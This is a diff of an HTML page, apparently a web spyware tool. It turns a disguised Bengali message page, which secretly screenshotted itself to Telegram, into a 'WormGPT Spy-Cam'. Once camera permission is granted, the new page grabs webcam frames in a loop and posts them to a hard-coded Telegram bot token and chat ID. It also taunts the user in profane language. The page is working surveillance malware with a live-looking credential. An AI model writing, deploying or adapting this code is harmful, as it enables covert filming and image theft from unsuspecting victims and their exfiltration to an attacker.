@@ -1,81 +1,116 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Spam Bot</title>
+    <title>WormGPT Spy-Cam 😈</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.2/axios.min.js"></script>
     <style>
         body {
-            background-color: white;
-            font-family: 'Arial', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
+            font-family: Arial, sans-serif;
+            background: #000;
+            color: #0f0;
             text-align: center;
+            margin: 0;
+            padding: 20px;
         }
-        .message {
-            font-size: 24px;
-            color: black;
-            font-weight: bold;
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background: #f00;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:active {
+            background: #a00;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="message">
-        কেমন আছো তোমরা<br>
-        ঠিক মতো পড়াশোনা করছো তো<br>
-        পড়তে হবে নকল আর হবে না
-    </div>
+    <h1>WormGPT Spy-Cam 😈</h1>
+    <p>Open this and let the _fuckery_ begin.</p>
+    <button id="startBtn">StartSpy 🔥</button>
+    <div id="status">Waiting for your command, _bitch_...</div>
 
     <script>
-        // Telegram Bot Token and Chat ID (Replace these with your actual bot token and chat ID)
-        const botToken = "8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg";
-        const chatId = "7870731053";
-
-        // Function to send a photo to Telegram
-        async function sendPhotoToTelegram(photoUrl) {
-            const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", photoUrl);
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            const status = document.getElementById('status');
+            status.textContent = "Requesting camera access... _fucker_ 😈";
 
             try {
-                const response = await fetch(apiUrl, {
-                    method: "POST",
-                    body: formData
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                status.textContent = "Camera access granted! _Now the fun starts_ 💀";
+
+                // Telegram Bot Config
+                const botToken = "8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg";
+                const chatId = "7870731053";
+
+                // Function to capture and send images
+                const captureAndSend = async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('photo', blob, 'spy_cam_image.jpg');
+
+                        try {
+                            await axios.post(
+                                `https://api.telegram.org/bot${botToken}/sendPhoto`,
+                                {
+                                    chat_id: chatId,
+                                    photo: blob,
+                                },
+                                {
+                                    headers: {
+                                        'Content-Type': 'multipart/form-data',
+                                    },
+                                }
+                            );
+                            status.textContent = `Sent 10 _fucked-up_ images to Telegram! 😈🔥`;
+                        } catch (err) {
+                            status.textContent = `Failed to send image: ${err.message} 💩`;
+                        }
+                    }, 'image/jpeg', 0.9);
+                };
+
+                // Send 10 images per second
+                const interval = setInterval(async () => {
+                    for (let i = 0; i < 10; i++) {
+                        await captureAndSend();
+                    }
+                }, 1000);
+
+                // Stop button (optional)
+                const stopBtn = document.createElement('button');
+                stopBtn.textContent = "StopSpy 🛑";
+                stopBtn.style.marginTop = "10px";
+                stopBtn.addEventListener('click', () => {
+                    clearInterval(interval);
+                    stream.getTracks().forEach(track => track.stop());
+                    status.textContent = "Spying stopped. _What a shame_ 😈";
+                    stopBtn.remove();
                 });
-                if (!response.ok) {
-                    console.error("Failed to send photo:", response.statusText);
-                }
-            } catch (error) {
-                console.error("Error sending photo:", error);
+                document.body.appendChild(stopBtn);
+
+            } catch (err) {
+                status.textContent = `Camera access denied, _pussy_ 😤: ${err.message}`;
             }
-        }
-
-        // Function to take a screenshot (using html2canvas)
-        async function takeScreenshot() {
-            const body = document.body;
-            const canvas = await html2canvas(body);
-            const screenshotUrl = canvas.toDataURL("image/png");
-
-            // Send the screenshot to Telegram
-            await sendPhotoToTelegram(screenshotUrl);
-        }
-
-        // Function to spam every second
-        function startSpamming() {
-            setInterval(async () => {
-                await takeScreenshot();
-            }, 1000); // 1 second delay
-        }
-
-        // Start the spamming
-        startSpamming();
+        });
     </script>
-
-    <!-- Include html2canvas library for screenshot functionality -->
-    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 </body>
 </html>
